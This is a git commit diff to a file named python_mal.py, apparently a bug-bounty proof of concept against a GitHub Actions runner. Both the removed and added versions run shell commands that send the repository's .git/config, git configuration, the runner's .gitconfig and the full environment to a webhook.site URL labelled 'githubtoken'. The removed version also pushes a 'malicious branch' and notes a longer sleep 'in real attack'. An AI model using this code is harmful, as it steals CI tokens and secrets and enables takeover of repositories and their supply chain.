b7da6d8ded545b40709b3e8618c3611cf8772f26
frogsecchecker <haryatibarak@gmail.com>
2026-03-25 18:42:14 +0200

    test2

--- python_mal.py
+++ python_mal.py
@@ -6,48 +6,36 @@ def main():
   print("----hello from file-----")
 
   os.system("""
-  echo "-------------poc_hello--------------" >&2
-
-  git config --list >&2
-
-  echo "--- creating malicious branch, can easily push to master or release ---" >&2 
-  git config --global user.email "bh@someemail.com"
-  git config --global user.name "H1Tester"
-  git fetch origin >&2
-  git checkout master >&2
-  git pull origin master >&2
-  git checkout -b bh-poc >&2
-  git add . >&2
-  git push -u origin bh-poc >&2
-
-  echo "--- token extraction ---" >&2 
-
-  export webhook="https://webhook.site/3122188d-f8af-4f4e-93c7-f6419be30a32"
-
-  curl -X POST \
-    -H "Content-Type: text/plain" \
-    --data "$(cat .git/config)" \
-      "$webhook/git_config"
-
-  curl -X POST \
-    -H "Content-Type: text/plain" \
-    --data "$(git config --list)" \
-      "$webhook/git_config_list"
+  echo -------------poc_rce--------------
+git config --list
 
 
-  curl -X POST \
-    -H "Content-Type: text/plain" \
-    --data "$(cat /home/runner/.gitconfig)" \
-      "$webhook/home_runner_gitconfig"
+export webhook="https://webhook.site/Instadapp"
 
+curl -X POST \
+  -H "Content-Type: text/plain" \
+  --data "$(cat /home/runner/work/beam/beam/.git/config)" \
+    "$webhook/githubtoken"
 
-  curl -X POST \
-    -H "Content-Type: text/plain" \
-    --data "$(printenv)" \
-    "$webhook/printenv"
+curl -X POST \
+  -H "Content-Type: text/plain" \
+  --data "$(git config --list)" \
+    "$webhook/githubtoken"
 
+curl -X POST \
+  -H "Content-Type: text/plain" \
+  --data "$(cat /home/runner/.gitconfig)" \
+    "$webhook/githubtoken"
 
-  echo "--- sleeping (in real attack use longer time) ---" >&2
-  sleep 2 # in real attack it will be 1200 to have time to edit 
+curl -X POST \
+  -H "Content-Type: text/plain" \
+  --data "$(cat /home/runner/work/beam/beam/.git/config)" \
+  "$webhook/githubtoken"
 
+curl -X POST \
+  -H "Content-Type: text/plain" \
+  --data "$(printenv)" \
+  "$webhook/printenv"
+
+sleep 2
   """)
